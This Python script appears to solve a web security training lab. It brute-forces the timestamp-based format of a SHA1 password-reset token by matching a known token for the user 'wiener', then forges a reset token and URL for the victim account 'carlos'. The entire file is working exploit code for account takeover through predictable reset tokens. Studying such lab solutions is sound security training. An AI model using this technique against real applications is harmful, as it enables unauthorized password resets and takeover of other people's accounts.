#!/usr/bin/env python3
import hashlib
from datetime import datetime, timezone

wiener_token = "c2c66061a65743632dc9f6c24e011a30083df258"
timestamp_str = "2025-10-01 00:56:07"

# Convert to datetime
dt = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
dt = dt.replace(tzinfo=timezone.utc)
unix_timestamp = int(dt.timestamp())

print(f"Target: {wiener_token}")
print(f"Unix timestamp: {unix_timestamp}\n")

# Brute force microseconds/milliseconds around the timestamp
# The token was generated at some point during that second
for microseconds in range(0, 1000000, 1000):  # Try every millisecond
    timestamp_ms = unix_timestamp * 1000 + microseconds // 1000
    timestamp_us = unix_timestamp * 1000000 + microseconds

    # Try many different format combinations
    formats = [
        f"wiener{timestamp_ms}",
        f"{timestamp_ms}wiener",
        f"wiener{timestamp_us}",
        f"{timestamp_us}wiener",
        f"wiener:{timestamp_ms}",
        f"{timestamp_ms}:wiener",
    ]

    for fmt in formats:
        token = hashlib.sha1(fmt.encode()).hexdigest()
        if token == wiener_token:
            print(f"✓✓✓ MATCH FOUND! ✓✓✓")
            print(f"Format: {fmt}")
            print(f"Token: {token}")

            # Generate carlos's token
            carlos_fmt = fmt.replace("wiener", "carlos")
            carlos_token = hashlib.sha1(carlos_fmt.encode()).hexdigest()
            print(f"\nCarlos format: {carlos_fmt}")
            print(f"Carlos token: {carlos_token}")
            print(f"\nCarlos reset URL:")
            print(f"https://0a6b00f3045c74848066fd3b00b800cc.web-security-academy.net/forgot-password?user=carlos&token={carlos_token}")
            exit(0)

print("\nNo match found. Trying wider microsecond range...")

# Try wider range if needed
for offset_ms in range(-2000, 2000):  # +/- 2 seconds
    timestamp_ms = (unix_timestamp + offset_ms // 1000) * 1000 + (offset_ms % 1000)

    formats = [
        f"wiener{timestamp_ms}",
        f"{timestamp_ms}wiener",
    ]

    for fmt in formats:
        token = hashlib.sha1(fmt.encode()).hexdigest()
        if token == wiener_token:
            print(f"✓✓✓ MATCH FOUND! ✓✓✓")
            print(f"Format: {fmt}")
            print(f"Token: {token}")

            carlos_fmt = fmt.replace("wiener", "carlos")
            carlos_token = hashlib.sha1(carlos_fmt.encode()).hexdigest()
            print(f"\nCarlos token: {carlos_token}")
            print(f"\nCarlos reset URL:")
            print(f"https://0a6b00f3045c74848066fd3b00b800cc.web-security-academy.net/forgot-password?user=carlos&token={carlos_token}")
            exit(0)

print("No match found in extended range either.")
